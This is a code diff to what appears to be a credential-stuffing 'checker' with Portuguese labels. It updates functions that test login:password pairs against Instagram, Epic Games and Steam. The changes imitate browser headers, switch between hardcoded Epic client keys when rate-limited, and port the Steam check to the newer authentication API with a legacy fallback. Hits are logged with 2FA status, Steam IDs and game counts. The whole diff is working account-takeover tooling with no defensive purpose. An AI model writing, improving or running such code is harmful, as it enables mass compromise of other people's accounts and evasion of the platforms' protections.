@@ -2112,12 +2112,15 @@ async function checkInstagram(login: string, password: string): Promise<CheckRes
   try {
     // Step 1: GET homepage to grab CSRF/mid/ig_did cookies
     const getResult = await runCurl([
-      "-L", "--max-redirs", "5",
+      "-L", "--max-redirs", "5", "--compressed",
       "-c", cookieFile, "-b", cookieFile,
-      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      "-H", "Accept-Language: pt-BR,pt;q=0.9",
-      "-H", "Pragma: no-cache",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+      "-H", "Accept-Encoding: gzip, deflate, br",
+      "-H", "Sec-Fetch-Dest: document",
+      "-H", "Sec-Fetch-Mode: navigate",
+      "-H", "Sec-Fetch-Site: none",
       INSTAGRAM_URL,
     ], INSTAGRAM_TIMEOUT);
 
@@ -2147,12 +2150,13 @@ async function checkInstagram(login: string, password: string): Promise<CheckRes
     ].join("&");
 
     const postResult = await runCurl([
-      "-X", "POST",
+      "--compressed", "-X", "POST",
       "-c", cookieFile, "-b", cookieFile,
-      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
       "-H", "Content-Type: application/x-www-form-urlencoded",
       "-H", "Accept: */*",
-      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+      "-H", "Accept-Encoding: gzip, deflate, br",
       "-H", "Origin: https://www.instagram.com",
       "-H", "Referer: https://www.instagram.com/",
       "-H", "Sec-Fetch-Dest: empty",
@@ -4124,21 +4128,35 @@ async function checkRoblox(login: string, password: string): Promise<CheckResult
 // ═══════════════════════════════════════════════════════════════════════════════
 async function checkEpicGames(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  // Credenciais públicas do cliente Epic Launcher
-  const EPIC_BASIC = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=";
-  try {
-    const tokenRes = await runCurl([
+  // Epic client credentials — try multiple fallback clients if one is rate-limited
+  // Fortnite iOS client (primary — supports password grant as of 2025)
+  const EPIC_IOS    = "OThmN2U0MmM3MTExNDMzYWI1MDJmNzJjNzc0YzJmNDA6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
+  // Epic Games Launcher (fallback)
+  const EPIC_EGL    = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=";
+
+  async function tryAuth(basic: string): Promise<CurlResult> {
+    return runCurl([
       "--compressed", "-L",
       "-X", "POST",
-      "-H", `Authorization: Basic ${EPIC_BASIC}`,
+      "-H", `Authorization: Basic ${basic}`,
       "-H", "Content-Type: application/x-www-form-urlencoded",
       "-H", "Accept: application/json",
+      "-H", `User-Agent: EpicGamesLauncher/15.17.1-29069790+++Portal+Release-Live Windows/10.0.22000.1.0.64bit`,
       "--data-urlencode", "grant_type=password",
       "--data-urlencode", `username=${login}`,
       "--data-urlencode", `password=${password}`,
       "--data-urlencode", "includePerms=false",
       "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
     ], 20_000);
+  }
+
+  try {
+    // Try iOS client first, fall back to EGL client if rate limited
+    let tokenRes = await tryAuth(EPIC_IOS);
+    if (tokenRes.statusCode === 429 || tokenRes.statusCode === 503) {
+      await sleep(800);
+      tokenRes = await tryAuth(EPIC_EGL);
+    }
 
     let tj: Record<string, unknown>;
     try { tj = JSON.parse(tokenRes.body); } catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }
@@ -4242,85 +4260,152 @@ async function checkSteam(login: string, password: string): Promise<CheckResult>
     return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
   }
 
-  try {
-    // Step 1 — Obter chave RSA do Steam para o username
-    const rsaRes = await runCurl([
-      "--compressed", "-L",
-      "-c", cookieFile, "-b", cookieFile,
-      "-A", DESKTOP_UA,
-      `https://steamcommunity.com/login/getrsakey/?username=${encodeURIComponent(login)}`,
-    ], 15_000);
-    let rsaJson: Record<string, unknown>;
-    try { rsaJson = JSON.parse(rsaRes.body); } catch { return { credential, login, status: "ERROR", detail: "rsa_parse_error" }; }
-    if (!rsaJson.success) return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+  const STEAM_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";
 
-    // Step 2 — Criptografar senha com RSA PKCS1 v1.5
-    const pubKeyPem = buildRSAPubKey(String(rsaJson.publickey_mod), String(rsaJson.publickey_exp));
+  try {
+    // Step 1 — RSA public key via new Steam Auth API (2023+)
+    // Fallback to old community endpoint if new one fails
+    let rsaMod = "", rsaExp = "", rsaTs = "";
+    const newRsaRes = await runCurl([
+      "--compressed", "-L",
+      "-A", STEAM_UA,
+      "-H", "Accept: application/json",
+      `https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name=${encodeURIComponent(login)}`,
+    ], 15_000);
+
+    try {
+      const nr = JSON.parse(newRsaRes.body) as Record<string, unknown>;
+      const resp = nr.response as Record<string, unknown>;
+      rsaMod = String(resp?.publickey_mod ?? "");
+      rsaExp = String(resp?.publickey_exp ?? "");
+      rsaTs  = String(resp?.timestamp ?? "");
+    } catch { /**/ }
+
+    if (!rsaMod) {
+      // Fallback: old community endpoint (some regions still respond)
+      const oldRsaRes = await runCurl([
+        "--compressed", "-L",
+        "-c", cookieFile, "-b", cookieFile,
+        "-A", STEAM_UA,
+        `https://steamcommunity.com/login/getrsakey/?username=${encodeURIComponent(login)}`,
+      ], 15_000);
+      try {
+        const or = JSON.parse(oldRsaRes.body) as Record<string, unknown>;
+        if (!or.success) return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+        rsaMod = String(or.publickey_mod ?? "");
+        rsaExp = String(or.publickey_exp ?? "");
+        rsaTs  = String(or.timestamp ?? "");
+      } catch { return { credential, login, status: "ERROR", detail: "rsa_parse_error" }; }
+    }
+
+    if (!rsaMod || !rsaExp) return { credential, login, status: "ERROR", detail: "NO_RSA_KEY" };
+
+    // Step 2 — Encrypt password with RSA PKCS1 v1.5
+    const pubKeyPem = buildRSAPubKey(rsaMod, rsaExp);
     const encPass   = publicEncrypt({ key: pubKeyPem, padding: constants.RSA_PKCS1_PADDING }, Buffer.from(password)).toString("base64");
 
-    // Step 3 — POST login
-    const loginRes = await runCurl([
+    // Step 3 — Begin auth session via new Steam IAuthenticationService API
+    const beginRes = await runCurl([
       "--compressed", "-L",
       "-c", cookieFile, "-b", cookieFile,
       "-X", "POST",
-      "-A", DESKTOP_UA,
+      "-A", STEAM_UA,
       "-H", "Content-Type: application/x-www-form-urlencoded",
-      "-H", "Referer: https://steamcommunity.com/login/",
-      "--data-urlencode", `username=${login}`,
-      "--data-urlencode", `password=${encPass}`,
-      "--data-urlencode", "emailauth=",
-      "--data-urlencode", "loginfriendlyname=",
-      "--data-urlencode", "captchagid=-1",
-      "--data-urlencode", "captcha_text=",
-      "--data-urlencode", "emailsteamid=",
-      "--data-urlencode", "remember_login=false",
-      "--data-urlencode", `rsatimestamp=${rsaJson.timestamp ?? ""}`,
-      "https://steamcommunity.com/login/dologin/",
+      "-H", "Origin: https://store.steampowered.com",
+      "-H", "Referer: https://store.steampowered.com/login/",
+      "--data-urlencode", `account_name=${login}`,
+      "--data-urlencode", `encrypted_password=${encPass}`,
+      "--data-urlencode", `encryption_timestamp=${rsaTs}`,
+      "--data-urlencode", "persistence=0",
+      "--data-urlencode", "platform_type=2",
+      "--data-urlencode", "website_id=Community",
+      "--data-urlencode", "guard_data=",
+      "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
     ], 20_000);
 
-    let lj: Record<string, unknown>;
-    try { lj = JSON.parse(loginRes.body); } catch { return { credential, login, status: "ERROR", detail: "login_parse_error" }; }
-
-    if (lj.emailauth_needed)   return { credential, login, status: "ERROR", detail: "2fa_email_required" };
-    if (lj.requires_twofactor) return { credential, login, status: "ERROR", detail: "2fa_totp_required" };
-    if (lj.captcha_needed)     return { credential, login, status: "ERROR", detail: "captcha_required" };
-    if (!lj.success) {
-      const msg = String(lj.message ?? "").toLowerCase();
-      if (msg.includes("incorrect") || msg.includes("wrong") || msg.includes("failed"))
-        return { credential, login, status: "FAIL", detail: "senha_incorreta" };
-      return { credential, login, status: "FAIL", detail: String(lj.message ?? "login_failed") };
+    let beginJson: Record<string, unknown>;
+    try { beginJson = JSON.parse(beginRes.body); } catch {
+      // New API failed — fallback to old dologin endpoint
+      const loginRes = await runCurl([
+        "--compressed", "-L",
+        "-c", cookieFile, "-b", cookieFile,
+        "-X", "POST", "-A", STEAM_UA,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Referer: https://steamcommunity.com/login/",
+        "--data-urlencode", `username=${login}`,
+        "--data-urlencode", `password=${encPass}`,
+        "--data-urlencode", "emailauth=",
+        "--data-urlencode", "captchagid=-1",
+        "--data-urlencode", "captcha_text=",
+        "--data-urlencode", `rsatimestamp=${rsaTs}`,
+        "https://steamcommunity.com/login/dologin/",
+      ], 20_000);
+      try {
+        const lj = JSON.parse(loginRes.body) as Record<string, unknown>;
+        if (lj.emailauth_needed)   return { credential, login, status: "ERROR", detail: "2fa_email_required" };
+        if (lj.requires_twofactor) return { credential, login, status: "ERROR", detail: "2fa_totp_required" };
+        if (lj.captcha_needed)     return { credential, login, status: "ERROR", detail: "captcha_required" };
+        if (!lj.success) return { credential, login, status: "FAIL", detail: String(lj.message ?? "login_failed").slice(0, 60) };
+        return { credential, login, status: "HIT", detail: "steam_ok_legacy" };
+      } catch { return { credential, login, status: "ERROR", detail: "begin_parse_error" }; }
     }
 
-    const parts: string[] = [];
+    // New API response
+    const apiErr = (beginJson.error as Record<string, unknown>)?.message as string ?? "";
+    if (beginRes.statusCode === 400 || apiErr) {
+      if (apiErr.toLowerCase().includes("invalid password") || apiErr.toLowerCase().includes("incorrect"))
+        return { credential, login, status: "FAIL", detail: "senha_incorreta" };
+      if (apiErr.toLowerCase().includes("not exist") || apiErr.toLowerCase().includes("no account"))
+        return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+      if (apiErr.toLowerCase().includes("rate") || apiErr.toLowerCase().includes("throttle"))
+        return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
+      if (apiErr) return { credential, login, status: "FAIL", detail: `steam_err:${apiErr.slice(0, 60)}` };
+      return { credential, login, status: "ERROR", detail: `HTTP_${beginRes.statusCode}` };
+    }
 
-    // Step 4 — Página da conta (carteira)
-    const storeRes = await runCurl([
-      "--compressed", "-L", "--max-redirs", "5",
-      "-c", cookieFile, "-b", cookieFile,
-      "-A", DESKTOP_UA,
-      "https://store.steampowered.com/account/",
-    ], 15_000);
-    const storeHtml = storeRes.body;
-    const walletMatch = storeHtml.match(/class="accountData price"[^>]*>\s*([^<]+)/i)
-      ?? storeHtml.match(/wallet_balance[^>]*>\s*([^<]+)/i);
-    if (walletMatch) parts.push(`carteira:${walletMatch[1].trim()}`);
+    const resp = (beginJson.response ?? {}) as Record<string, unknown>;
+    const steamid = String(resp.steamid ?? "");
+    if (!steamid || steamid === "0") return { credential, login, status: "FAIL", detail: "invalid_credentials" };
 
-    // Step 5 — Perfil (steamId + nome + nível)
-    const profRes = await runCurl([
-      "--compressed", "-L", "--max-redirs", "5",
-      "-c", cookieFile, "-b", cookieFile,
-      "-A", DESKTOP_UA,
-      "https://steamcommunity.com/my/",
-    ], 15_000);
-    const profHtml = profRes.body;
-    const sidMatch  = profHtml.match(/steamid=(\d+)/i) ?? profHtml.match(/\/profiles\/(\d+)/i);
-    if (sidMatch) parts.unshift(`steamId:${sidMatch[1]}`);
-    const nameMatch = profHtml.match(/class="[^"]*actual_persona_name[^"]*"[^>]*>([^<]+)/i);
-    if (nameMatch) parts.push(`nome:${nameMatch[1].trim()}`);
-    const lvlMatch  = profHtml.match(/friendPlayerLevelNum[^>]*>(\d+)/i) ?? profHtml.match(/Steam Level.*?(\d+)/i);
-    if (lvlMatch) parts.push(`level:${lvlMatch[1]}`);
+    // Determine 2FA requirements from allowed_confirmations
+    const confs = (resp.allowed_confirmations as Record<string, unknown>[]) ?? [];
+    const confTypes = confs.map(c => Number(c.confirmation_type ?? 0));
+    // type 2 = mobile TOTP, type 3 = email, type 4 = device/machine token
+    if (confTypes.includes(2)) return { credential, login, status: "HIT", detail: `steamId:${steamid} | 2fa_mobile_totp` };
+    if (confTypes.includes(3)) return { credential, login, status: "HIT", detail: `steamId:${steamid} | 2fa_email` };
 
-    if (parts.length === 0) parts.push("steam_ok");
+    // No 2FA — try to complete session and get profile data
+    const parts: string[] = [`steamId:${steamid}`];
+    try {
+      const clientId  = String(resp.client_id  ?? "");
+      const requestId = String(resp.request_id ?? "");
+      if (clientId && requestId) {
+        await sleep(500);
+        const pollRes = await runCurl([
+          "--compressed", "-L",
+          "-X", "POST", "-A", STEAM_UA,
+          "-H", "Content-Type: application/x-www-form-urlencoded",
+          "--data-urlencode", `client_id=${clientId}`,
+          "--data-urlencode", `request_id=${requestId}`,
+          "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
+        ], 15_000);
+        const poll = (JSON.parse(pollRes.body) as Record<string, unknown>).response as Record<string, unknown>;
+        const accessToken = String(poll?.access_token ?? "");
+        if (accessToken) {
+          // Use Steam Player Service to get persona name
+          const pRes = await runCurl([
+            "--compressed", "-L",
+            "-A", STEAM_UA,
+            "-H", `Authorization: Bearer ${accessToken}`,
+            `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?access_token=${accessToken}&include_appinfo=false`,
+          ], 10_000);
+          try {
+            const pj = (JSON.parse(pRes.body) as Record<string, unknown>).response as Record<string, unknown>;
+            if (pj?.game_count !== undefined) parts.push(`jogos:${pj.game_count}`);
+          } catch { /**/ }
+        }
+      }
+    } catch { /**/ }
     return { credential, login, status: "HIT", detail: parts.join(" | ") };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
